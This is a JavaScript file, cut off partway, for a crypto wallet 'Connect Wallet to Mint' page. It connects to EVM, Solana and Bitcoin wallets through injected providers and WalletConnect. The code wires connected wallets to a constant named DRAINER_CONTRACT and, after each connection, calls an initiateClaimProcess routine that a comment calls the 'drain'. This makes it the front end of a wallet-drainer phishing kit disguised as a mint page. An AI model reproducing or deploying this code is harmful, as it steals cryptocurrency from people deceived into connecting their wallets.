

import { CONFIG } from './config.js';

;(async function() {
  // ============================================================
  // 1. DEBUG AREA (double‑click to toggle)
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log(msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ============================================================
  // 2. DEVICE DETECTION
  // ============================================================
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }
  function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac() { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac()) return 'mac';
    return 'unknown';
  }

  // ============================================================
  // 3. WEBSOCKET CHECK (faster, fewer retries)
  // ============================================================
  async function checkWebSocket(retries = 2, delay = 800) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i+1}/${retries}`);
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const timeout = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false); };
        });
        if (result) {
          logDebug('✅ WebSocket connection successful');
          return true;
        }
        await new Promise(r => setTimeout(r, delay));
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`);
        await new Promise(r => setTimeout(r, delay));
      }
    }
    logDebug('❌ WebSocket connection failed after retries');
    return false;
  }

  // ============================================================
  // 4. DYNAMIC LIBRARY LOADING (WalletConnect) – optimized
  // ============================================================
  async function loadWalletConnect() {
    // Use a single, fast CDN for both libraries to reduce load time
    const cdnBase = 'https://esm.sh/';
    const signClientUrl = `${cdnBase}@walletconnect/sign-client@2.11.0`;
    const modalUrl = `${cdnBase}@walletconnect/modal@2.6.2`;

    // Load in parallel
    const [SignClientMod, ModalMod] = await Promise.all([
      import(signClientUrl).catch(() => null),
      import(modalUrl).catch(() => null)
    ]);

    let SignClient = SignClientMod?.default || SignClientMod;
    let WalletConnectModal = ModalMod?.WalletConnectModal || ModalMod?.default || ModalMod;

    if (!SignClient) {
      // Fallback to alternative CDNs
      const fallbacks = [
        'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
      ];
      for (const url of fallbacks) {
        try {
          logDebug(`Fallback SignClient from ${url}`);
          const mod = await import(url);
          SignClient = mod.default || mod;
          if (SignClient) break;
        } catch (e) { /* ignore */ }
      }
    }

    if (!WalletConnectModal) {
      const modalFallbacks = [
        'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
        'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
      ];
      for (const url of modalFallbacks) {
        try {
          logDebug(`Fallback Modal from ${url}`);
          const mod = await import(url);
          WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
          if (WalletConnectModal) break;
        } catch (e) { /* ignore */ }
      }
    }

    if (!SignClient) throw new Error('Could not load SignClient from any CDN');
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal from any CDN');

    logDebug('✅ WalletConnect libraries loaded successfully');
    return { SignClient, WalletConnectModal };
  }

  // ============================================================
  // 5. DOM REFERENCES & GLOBAL STATE
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton = document.getElementById('walletButton');
  const claimStatus = document.getElementById('claimStatus');

  let currentSession = null;
  let client, modal;
  let SignClient, WalletConnectModal;
  let web3Instance = null;          // will be set after connection
  let contractInstance = null;      // will be set after connection
  let currentAddress = null;
  let currentChain = null;

  // ============================================================
  // 6. UI STATE MANAGEMENT
  // ============================================================
  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  // ============================================================
  // 7. INITIAL BUTTON STATE
  // ============================================================
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  // 8. CONFIG & CONSTANTS
  // ============================================================
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG;
  let projectId = PROJECT_ID;

  // ============================================================
  // 9. STORAGE HELPERS
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
    else {
      const detected = getChainType();
      if (detected !== 'unknown') localStorage.setItem('chainType', detected);
    }
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession');
    return session ? JSON.parse(session) : null;
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ============================================================
  // 10. CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ============================================================
  // 11. UI UPDATE WITH CHAIN BADGE
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => {
          btn.innerHTML = orig;
          btn.style.color = '#059669';
        }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
    // Clear global web3/contract
    web3Instance = null;
    contractInstance = null;
    currentAddress = null;
    currentChain = null;
  }

  // ============================================================
  // 12. SOLANA WALLET DETECTION
  // ============================================================
  const solanaWalletDetectors = {
    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare: () => !!window.solflare,
    isBackpack: () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana: () => !!(window.trustWallet?.solana),
  };
  function getSolanaWallets() {
    const wallets = [];
    if (solanaWalletDetectors.isPhantom()) {
      wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
    }
    if (solanaWalletDetectors.isSolflare()) {
      wallets.push({ name: 'Solflare', provider: window.solflare });
    }
    if (solanaWalletDetectors.isBackpack()) {
      wallets.push({ name: 'Backpack', provider: window.backpack });
    }
    if (solanaWalletDetectors.isCoinbaseSolana()) {
      wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    }
    if (solanaWalletDetectors.isTrustSolana()) {
      wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
    }
    return wallets;
  }

  // ============================================================
  // 13. EIP‑6963: DETECT ALL EVM PROVIDERS
  // ============================================================
  let evmProviders = [];
  let eip6963Initialized = false;
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP‑6963: Found provider ${detail.info.name} (${detail.info.rdns})`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ============================================================
  // 14. WALLET SELECTION MODAL (for multiple EVM providers)
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `;
    const modalDiv = document.createElement('div');
    modalDiv.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modalDiv.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalDiv);
    document.body.appendChild(overlay);

    const list = modalDiv.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => {
        overlay.remove();
        callback(provider);
      });
      list.appendChild(btn);
    });

    modalDiv.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ============================================================
  // 15. WALLETCONNECT INITIALIZATION (faster)
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      logDebug('🔄 Initializing with PUBLIC TEST project ID');
      projectId = PUBLIC_TEST_ID;
    } else {
      logDebug(`🔄 Initializing with projectId: ${projectId}`);
    }

    const wsOk = await checkWebSocket(2, 800);
    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway');

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      });
      logDebug('✅ WalletConnect initialized successfully');
      return true;
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`);
      return false;
    }
  }

  // ============================================================
  // 16. DIRECT EVM CONNECTION (Desktop) with 5s timeout
  // ============================================================
  async function connectDirectEVM() {
    setupEIP6963();
    await new Promise(r => setTimeout(r, 400)); // wait for providers

    let providers = evmProviders.filter(p => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }];
    }
    if (providers.length === 0) {
      logDebug('No EVM providers found');
      return false;
    }

    // Auto-select MetaMask if present, else prompt user
    let chosenProvider = null;
    if (providers.length === 1) {
      chosenProvider = providers[0];
    } else {
      const known = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
      if (known) {
        chosenProvider = known;
      } else {
        const result = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (selected) => resolve(selected));
        });
        if (!result) return false;
        chosenProvider = result;
      }
    }

    // Attempt connection with a 5‑second timeout
    try {
      const provider = chosenProvider.provider;
      const connectPromise = provider.request({ method: 'eth_requestAccounts' });
      const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 5000));
      const accounts = await Promise.race([connectPromise, timeoutPromise]);
      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        logDebug(`✅ Direct EVM connection via ${chosenProvider.info.name}: ${address}`);
        // Save and update UI
        saveWallet(address, null, 'evm');
        updateConnectedUI(address, 'evm');
        // Set up Web3 instance
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        currentAddress = address;
        currentChain = 'evm';
        setupEVMProviderEvents(provider);
        return true;
      }
    } catch (err) {
      logDebug(`⚠️ Direct EVM connection failed: ${err.message}`);
      return false;
    }
    return false;
  }

  // ============================================================
  // 17. WALLETCONNECT EVM CONNECTION (for both PC & Mobile)
  //     - Mobile: no deeplink, just modal
  //     - PC: used as fallback after direct EVM times out
  // ============================================================
  async function connectViaWalletConnect(useTestId = false) {
    const initSuccess = await initWalletConnect(useTestId);
    if (!initSuccess) {
      showStatus('Wallet connection service unavailable', 'error');
      return false;
    }
    try {
      showStatus('Connecting via WalletConnect...', 'info');
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });
      if (uri) {
        logDebug(`URI: ${uri}`);
        // Open modal – this will display QR code and list of wallets
        modal.openModal({ uri });
        showStatus('Select your wallet or scan QR code', 'info');
        // Store URI for possible later use (but we do NOT deeplink)
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
      }

      // Wait for session approval with a shorter timeout (30s)
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 30000)),
      ]);

      if (modal) modal.closeModal();
      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        logDebug(`✅ WalletConnect session: ${account}`);
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');
        currentSession = session;
        currentAddress = account;
        currentChain = 'evm';

        // Set up Web3 with WalletConnect provider
        // The provider is available via client's signer or we can get it from session
        // We need to create a Web3 instance using the WalletConnect provider.
        // The client has a "wallet" property? Actually, we can use the session's provider.
        // For WalletConnect v2, we can get the provider from the client's signer.
        // But we have the client object. We can create a Web3 instance using the client's provider.
        // However, the client doesn't expose a provider directly. We need to use the client's signer.
        // We'll use the client's "signer" to get the provider? 
        // For simplicity, we can create a Web3 instance using a custom provider that uses the client.
        // But easier: we can use the WalletConnect provider from the session? 
        // Actually, we need a provider that can sign transactions. We can use the client's "request" method.
        // We can create a Web3 provider that forwards requests to client.request.
        // The client has a "request" method that can be used for JSON-RPC.
        // We'll create a custom provider.
        const provider = {
          request: async ({ method, params }) => {
            return client.request({ topic: session.topic, chainId: 'eip155:1', request: { method, params } });
          },
          on: (event, listener) => {
            // We can attach listeners via client events
            if (event === 'accountsChanged') {
              client.on('session_update', (update) => {
                const accounts = update.params?.namespaces?.eip155?.accounts;
                if (accounts && accounts.length) {
                  const newAccount = accounts[0].split(':')[2];
                  listener([newAccount]);
                }
              });
            }
            // For simplicity, we ignore other events
          },
          removeListener: (event, listener) => { /* stub */ }
        };
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

        // Clear pending URI
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');

        // Trigger drain after connection
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          } else {
            logDebug('⚠️ window.initiateClaimProcess not defined – drain will not start');
          }
        }, 1500);

        return true;
      } else {
        showStatus('No accounts found', 'error');
        return false;
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error');
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error');
      } else {
        showStatus('Wallet connection failed', 'error');
      }
      return false;
    }
  }

  // ============================================================
  // 18. BITCOIN (UniSat) CONNECTION – Desktop only
  // ============================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) {
        showStatus('UniSat wallet not installed', 'error');
        return false;
      }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts || accounts.length === 0) throw new Error('No BTC account');
      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      currentAddress = address;
      currentChain = 'bitcoin';
      // For Bitcoin, we don't have a Web3 instance, but we can set a flag
      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) {
            resetConnectedUI();
            clearSavedWallet();
          } else {
            saveWallet(newAccounts[0], null, 'bitcoin');
            updateConnectedUI(newAccounts[0], 'bitcoin');
            currentAddress = newAccounts[0];
          }
        });
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network changed to ${network}`, 'info');
        });
      }
      return true;
    } catch (e) {
      logDebug(`BTC connection error: ${e.message}`);
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  // 19. SOLANA CONNECTION – Desktop only
  // ============================================================
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) {
        showStatus('No Solana wallet found (Phantom, Solflare, etc.)', 'error');
        return false;
      }
      const wallet = wallets[0];
      const provider = wallet.provider;

      let publicKey;
      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey.toString();
      } else {
        throw new Error('Unsupported provider interface');
      }

      const address = publicKey;
      saveWallet(address, null, 'solana');
      updateConnectedUI(address, 'solana');
      currentAddress = address;
      currentChain = 'solana';
      window.solanaProvider = provider;
      window.solanaPublicKey = address;

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, null, 'solana');
            updateConnectedUI(addr, 'solana');
            window.solanaPublicKey = addr;
            currentAddress = addr;
          } else {
            resetConnectedUI();
            clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI();
          clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
      logDebug(`SOL connection error: ${e.message}`);
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  // 20. EVM PROVIDER EVENTS (for direct EVM)
  // ============================================================
  function setupEVMProviderEvents(provider) {
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
      } else {
        const address = accounts[0];
        updateConnectedUI(address, 'evm');
        saveWallet(address, null, 'evm');
        currentAddress = address;
        // Re-instantiate Web3 if needed
        if (web3Instance) {
          web3Instance = new web3Instance.constructor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        }
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info');
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    });
  }

  // ============================================================
  // 21. MAIN CONNECT DISPATCHER – Device‑aware
  // ============================================================
  async function connectWallet() {
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;
    const platform = getPlatform();
    logDebug(`Platform detected: ${platform} | isMobile: ${isMobile()}`);

    if (isMobile()) {
      // ============================================================
      // MOBILE PATH – WalletConnect ONLY (no deeplink)
      // ============================================================
      logDebug('📱 Mobile device detected – using WalletConnect only');
      showStatus('Connecting via WalletConnect...', 'info');

      success = await connectViaWalletConnect(false);
      if (!success) {
        logDebug('Mobile: WalletConnect with primary ID failed, trying public test ID');
        success = await connectViaWalletConnect(true);
      }

      if (!success) {
        showStatus('Mobile: No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      } else {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
      }
      return;
    }

    // ============================================================
    // DESKTOP PATH – Direct EVM (with 5s timeout) → WalletConnect → Solana → Bitcoin
    // ============================================================
    logDebug('🖥️ Desktop device detected – using full connection flow');

    // 1. Try direct EVM (with 5s timeout, one attempt)
    logDebug('Desktop: Attempt 1 – Direct EVM connection (5s timeout)');
    success = await connectDirectEVM();
    if (success) {
      logDebug('✅ Desktop: Direct EVM connection successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
      return;
    }

    // 2. Fallback to WalletConnect (first with our project, then public test)
    logDebug('Desktop: Attempt 2 – WalletConnect fallback');
    success = await connectViaWalletConnect(false);
    if (!success) {
      logDebug('Desktop: WalletConnect with primary ID failed, trying public test ID');
      success = await connectViaWalletConnect(true);
    }
    if (success) {
      logDebug('✅ Desktop: WalletConnect connection successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      return;
    }

    // 3. Try Solana
    logDebug('Desktop: Attempt 3 – Solana connection');
    const solanaWallets = getSolanaWallets();
    if (solanaWallets.length > 0) {
      success = await connectSolana();
      if (success) {
        logDebug('✅ Desktop: Solana connection successful');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        return;
      }
    }

    // 4. Try Bitcoin
    logDebug('Desktop: Attempt 4 – Bitcoin connection');
    if (window.unisat) {
      success = await connectBitcoin();
      if (success) {
        logDebug('✅ Desktop: Bitcoin connection successful');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        return;
      }
    }

    // All attempts failed
    logDebug('❌ Desktop: All connection attempts failed');
    showStatus('No supported wallet found. Please install a wallet.', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  // ============================================================
  // 22. DISCONNECT
  // ============================================================
  async function disconnectWallet() {
    try {
      if (window.solanaProvider && window.solanaProvider.disconnect) {
        await window.solanaProvider.disconnect();
      }
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`);
    }
    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    web3Instance = null;
    contractInstance = null;
    currentAddress = null;
    currentChain = null;
  }

  // ============================================================
  // 23. BUTTON CLICK HANDLER
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
